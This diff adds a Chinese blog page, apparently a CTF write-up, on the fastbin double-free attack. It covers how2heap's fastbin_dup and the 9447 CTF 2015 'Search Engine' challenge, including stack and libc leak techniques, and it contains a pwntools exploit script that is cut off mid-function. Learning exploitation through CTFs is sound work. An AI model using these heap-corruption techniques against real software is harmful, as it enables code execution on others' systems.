@@ -1,0 +1,899 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="how2heap," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Fastbin double free attack">
+<meta name="keywords" content="how2heap">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastbin attack">
+<meta property="og:url" content="http://yoursite.com/2019/04/14/fastbin-attack/index.html">
+<meta property="og:site_name" content="Muirelle的博客">
+<meta property="og:description" content="Fastbin double free attack">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/3yrP7Nu.png">
+<meta property="og:image" content="https://i.imgur.com/DsFYPlx.png">
+<meta property="og:image" content="https://i.imgur.com/Rkx6YVt.png">
+<meta property="og:image" content="https://i.imgur.com/Yamwdfu.png">
+<meta property="og:image" content="https://i.imgur.com/wdvhZII.png">
+<meta property="og:image" content="https://i.imgur.com/j5hZSBe.png">
+<meta property="og:image" content="https://i.imgur.com/YrMVBLw.png">
+<meta property="og:image" content="https://i.imgur.com/NtnJJJ7.png">
+<meta property="og:image" content="https://i.imgur.com/NXd0TqW.png">
+<meta property="og:image" content="https://i.imgur.com/Gi3CUHx.png">
+<meta property="og:image" content="https://i.imgur.com/HXxFdl3.png">
+<meta property="og:image" content="https://i.imgur.com/hzK1fsw.png">
+<meta property="og:image" content="https://i.imgur.com/E9ikH31.png">
+<meta property="og:updated_time" content="2019-05-04T01:58:04.398Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="fastbin attack">
+<meta name="twitter:description" content="Fastbin double free attack">
+<meta name="twitter:image" content="https://i.imgur.com/3yrP7Nu.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/14/fastbin-attack/"/>
+
+
+
+
+
+  <title>fastbin attack | Muirelle的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Muirelle的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/14/fastbin-attack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Muirelle">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Muirelle的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">fastbin attack</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-14T20:45:46+08:00">
+                2019-04-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/04/14/fastbin-attack/" class="leancloud_visitors" data-flag-title="fastbin attack">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Fastbin double free attack</p>
+<a id="more"></a>
+<p><strong><a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="noopener">fastbin_dup</a></strong></p>
+<h1 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h1><p>fastbin中的chunk是单链表结构。由于在free一个chunk时，libc只会检查此chunk是否和fastbin中第一个chunk是同一个，是的话则会报错(double free or corruption (fasttop))，所以在两次free同一个chunk间再free另一个chunk就不会被检测到。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">	<span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line">	<span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一开始申请了3个chunk，之后free的顺序为<strong>a-&gt;b-&gt;a</strong>，此时再申请三个chunk就会发现返回的第一个和第三个指针指向的是同一个chunk，也就是a chunk。</p>
+<p><img src="https://i.imgur.com/3yrP7Nu.png" alt=""><br>第一次free之前，堆中chunk的情况，申请的8字节加上头部8字节再加prev_inuse一字节所以size为17字节。</p>
+<p><img src="https://i.imgur.com/DsFYPlx.png" alt=""><br>第一次free后，a chunk插入到fastbin中。</p>
+<p><img src="https://i.imgur.com/Rkx6YVt.png" alt=""><br>第二次free后，b chunk插入到fastbin首部。</p>
+<p><img src="https://i.imgur.com/Yamwdfu.png" alt=""><br>第三次free后，a chunk再次插入到fastbin首部。</p>
+<p>三次free过程的示意图：<br><img src="https://i.imgur.com/wdvhZII.png" alt=""></p>
+<p>紧接着是三次malloc，示意图如下：<br><img src="https://i.imgur.com/j5hZSBe.png" alt=""></p>
+<p>通过double free，现在得到了两个指向同一个chunk的指针。如果在第一次malloc之后，修改原本位于fd处的值为某一地址(addr_evil)，第三次malloc后，得到的指针就指向了该地址(addr_evil)，利用程序提供的功能(如果有的话)可以在该地址上写任意值。</p>
+<p>下面一道例题具体说明如何利用double free漏洞</p>
+<h1 id="9447-CTF-2015-Search-Engine"><a href="#9447-CTF-2015-Search-Engine" class="headerlink" title="9447 CTF 2015: Search Engine"></a>9447 CTF 2015: Search Engine</h1><p>题目： <strong><a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine</a></strong></p>
+<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>程序提供了输入句子和查找单词的功能，如果查找的单词存在于输入过的句子中，则可以删掉该句子。程序将以空格为间隔字符串视为单词。下面是一个例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1: Search with a word</span><br><span class="line">2: Index a sentence</span><br><span class="line">3: Quit</span><br><span class="line">2</span><br><span class="line">Enter the sentence size:</span><br><span class="line">8</span><br><span class="line">Enter the sentence:</span><br><span class="line">aaa bb c</span><br><span class="line">Added sentence</span><br><span class="line">1: Search with a word</span><br><span class="line">2: Index a sentence</span><br><span class="line">3: Quit</span><br><span class="line">1</span><br><span class="line">Enter the word size:</span><br><span class="line">1</span><br><span class="line">Enter the word:</span><br><span class="line">c</span><br><span class="line">Found 5: aaa bb c</span><br><span class="line">Delete this sentence (y/n)?</span><br><span class="line">y</span><br><span class="line">Deleted!</span><br><span class="line">1: Search with a word</span><br><span class="line">2: Index a sentence</span><br><span class="line">3: Quit</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/YrMVBLw.png" alt=""></p>
+<p>从堆可以看出，我们输入的句子(<strong>aaa bb c</strong>)被拆成了三个单词，每个单词作为一个word结构体依次存放在堆中。该单词和其对应句子的信息被存放在结构体中。所有的word组成了一个words_list。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">word</span>&#123;</span></span><br><span class="line">	<span class="keyword">char</span> *word_ptr;	<span class="comment">//指向单词所在的句子中该单词的起始位置</span></span><br><span class="line">	<span class="keyword">int</span> word_len; <span class="comment">//单词长度</span></span><br><span class="line">	<span class="keyword">char</span> *sentence;	<span class="comment">//指向单词所在的句子首部</span></span><br><span class="line">	<span class="keyword">int</span> sentence_len; <span class="comment">//句子长度</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">word</span> *<span class="title">next</span>;</span> <span class="comment">//指向链表中下一个word节点</span></span><br><span class="line">&#125;;	<span class="comment">//共40字节</span></span><br></pre></td></tr></table></figure>
+<p>分析了word结构体之后再看search函数就很容易了，于是我们可以得到更清晰的版本：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> size;</span><br><span class="line"><span class="keyword">void</span> *tmp_word;</span><br><span class="line">size = read_int();</span><br><span class="line">tmp_word = <span class="built_in">malloc</span>(size);</span><br><span class="line">_input(tmp_word, size, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">char</span> choice;</span><br><span class="line"><span class="keyword">for</span>(i = word; i; i = i-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>(*i-&gt;sentence)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(i-&gt;word_len == size &amp;&amp; !<span class="built_in">memcmp</span>(i-&gt;word_ptr, tmp_word, size))</span><br><span class="line">		&#123;</span><br><span class="line">			__printf_chk(<span class="number">1L</span>L; <span class="string">"Found %d: "</span>, i-&gt;sentence_len);</span><br><span class="line">			fwrite(i-&gt;sentence, <span class="number">1u</span>LL, i-&gt;sentence_len, <span class="built_in">stdout</span>);</span><br><span class="line">			<span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">"Delete this sentence (y/n)?"</span>);</span><br><span class="line">			_input(&amp;choice, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span>(choice == <span class="string">'y'</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">memset</span>(i-&gt;sentence, <span class="number">0</span>, i-&gt;sentence_len);</span><br><span class="line">				<span class="built_in">free</span>(i-&gt;sentence);</span><br><span class="line">				<span class="built_in">puts</span>(<span class="string">"Delete!"</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(tmp_word);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>search函数在查找单词的时候先通过判断sentence指向的句子是否为空，若非空则可以进一步查找并通过memset将句子内容清零，然后free掉句子对应的chunk来删除句子。但是如果我们申请足够大的一个sentence chunk，在free掉该chunk时仍会保留fd和bk指针，由于该fd，bk指针位于sentence首部，所以如再进行search查找单词，就可以直接绕过检测句子是否为空的判断，从而触发UAF漏洞。</p>
+<h2 id="leak-stack"><a href="#leak-stack" class="headerlink" title="leak_stack"></a>leak_stack</h2><p>还有一个漏洞存在于read_int函数，大致如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_int</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> result;</span><br><span class="line">	<span class="keyword">char</span> *endptr;</span><br><span class="line">	<span class="keyword">char</span> nptr[<span class="number">48</span>];</span><br><span class="line">	</span><br><span class="line">	_input(nptr, <span class="number">48</span>, <span class="number">1</span>);</span><br><span class="line">	result = strtol(nptr, &amp;endptr, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(endptr == nptr)</span><br><span class="line">	&#123;</span><br><span class="line">		__printf_chk(<span class="number">1L</span>L, <span class="string">"%s is not a valid number\n"</span>, nptr);</span><br><span class="line">		result = read_int();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该函数接收一个至多48字节的字符串，转化成数字后返回。如果转化失败则会打印该字符串。漏洞就在于：如果输入字符串长度为48字节，那么_input函数就没有办法在该字符串最后添加空字符，从而导致在打印该字符串时泄露栈中后面的数据。</p>
+<p>但是有一点要注意，在利用这个漏洞时，第一次泄露会失败，因为栈中字符串后面刚好是空字符中断了打印，但由于该函数是递归调用的，我们可以再次输入48字节的字符串，通过累加栈帧的方式再次泄露栈中的数据。</p>
+<p><img src="https://i.imgur.com/NtnJJJ7.png" alt=""></p>
+<p>可以看到第一个栈帧(橙色)，后面是\x00，递归调用一次后，可以泄露出<strong>0x00007fffffffe3e0</strong>，再通过计算偏移，可以找到返回值所在的位置。</p>
+<p><img src="https://i.imgur.com/NXd0TqW.png" alt=""><br>泄露出了数据</p>
+<h2 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak_libc"></a>leak_libc</h2><p>刚才提到了UAF，触发UAF的条件是申请一个大于fastbin大小的chunk然后free掉该chunk，该chunk会被添加到unsorted bin中，并且fd和bk会指向<strong>main_arena</strong>中，通过泄露fd，bk得到<strong>main_arena</strong>，结合偏移计算出libc基址。libc中的main_arena偏移可以在libc中的malloc_trim()函数中找到。</p>
+<p><img src="https://i.imgur.com/Gi3CUHx.png" alt=""></p>
+<p>例如现在申请一个chunk。</p>
+<p><img src="https://i.imgur.com/HXxFdl3.png" alt=""></p>
+<p>free掉之后，fd和bk都指向<strong>main_arena+88</strong>中。通过程序提供的search函数泄露该值。</p>
+<p>大致过程如下<br><img src="https://i.imgur.com/hzK1fsw.png" alt=""></p>
+<p>此时用search查找4个\x00就会绕过第一个if判断，并且由于sentence已经置零，所以\x00也会在bbbb处匹配成功，从而进入第二个if语句内部，打印出fd，bk的值。</p>
+<p>如果题目给了libc文件可以直接用ida打开找到malloc_trim函数查看main_arena偏移，由于这道题是本地环境，所以直接用ldd查看使用的libc版本再找到main_arena偏移。</p>
+<h2 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h2><p>有了stack和libc，相当于有了纸和笔，还差一个写的动作将libc中的system写到栈上。</p>
+<p>先申请三个chunk，分别包含</p>
+<p><strong> ‘A’*50 + ‘ d’ </strong></p>
+<p><strong> ‘B’*50 + ‘ d’ </strong></p>
+<p><strong> ‘C’*50 + ‘ d’ </strong></p>
+<p>然后查找<strong>d</strong>，依次free掉三个chunk。这时的fastbin：<strong>fastbin HEAD -&gt; A -&gt; B -&gt; C -&gt; NULL</strong></p>
+<p>接着再查找<strong>\x00</strong>，由于C chunk的fd为空，所以无法通过第一个if，再判断B chunk，由于存在fd，第一个if被绕过，此时可以选择free掉B chunk(第二次free掉B chunk，成功double free)。此时的fastbin：<br><strong>fastbin HEAD -&gt; B -&gt; A -&gt; B -&gt; C -&gt; NULL</strong></p>
+<p>过程如图：<br><img src="https://i.imgur.com/E9ikH31.png" alt=""></p>
+<p>这时malloc一次后我们会得到B chunk，向其中写入之前泄露的stack加上偏移(变成函数返回值所在的位置)，再malloc两次，依次得到A chunk和Bchunk，此时的fastbin指向的就是刚才写入的栈的值，再次malloc，就会得到一个指向该地址的指针，用one_gadget覆盖该返回地址，在程序退出时getshell。</p>
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./search-bf61fbb8fa7212c814b2607a81a84adf'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">()</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">'Quit\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'1'</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'size:\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'a'</span>*<span class="number">48</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'number\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'a'</span>*<span class="number">48</span>)</span><br><span class="line">        leak_stack = int(r.recvuntil(<span class="string">' is '</span>)[<span class="number">-10</span>:<span class="number">-4</span>][::<span class="number">-1</span>].encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">        log.success(<span class="string">'stack: '</span>+hex(leak_stack))</span><br><span class="line">        r.sendline(<span class="string">'1'</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'word:\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'A'</span>)</span><br><span class="line">        <span class="keyword">return</span> leak_stack</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(s)</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">'Quit\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'1'</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'size:\n'</span>)</span><br><span class="line">        r.sendline(str(len(s)))</span><br><span class="line">        r.recvuntil(<span class="string">'word:\n'</span>)</span><br><span class="line">        r.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(s)</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">'Quit\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'2'</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'size:\n'</span>)</span><br><span class="line">        r.sendline(str(len(s)))</span><br><span class="line">        r.recvuntil(<span class="string">'sentence:\n'</span>)</span><br><span class="line">        r.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(c)</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">'(y/n)?'</span>)</span><br><span class="line">        r.sendline(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">        index(<span class="string">'A'</span>*<span class="number">507</span>+<span class="string">' bbbb'</span>)</span><br><span class="line">        search(<span class="string">'bbbb'</span>)</span><br><span class="line">        delete(<span class="string">'y'</span>)</span><br><span class="line">        search(<span class="string">'\x00'</span>*<span class="number">4</span>)</span><br><span class="line">        r.recvuntil(<span class="string">': '</span>)</span><br><span class="line">        libc_addr = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">        log.success(<span class="string">'libc: '</span>+hex(libc_addr))</span><br><span class="line">        delete(<span class="string">'n'</span>)</span><br><span class="line">        <span class="keyword">return</span> libc_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double_free</span><span class="params">(stack,libc)</span>:</span></span><br><span class="line">        <span class="comment">#malloc 3 chunk</span></span><br><span class="line">        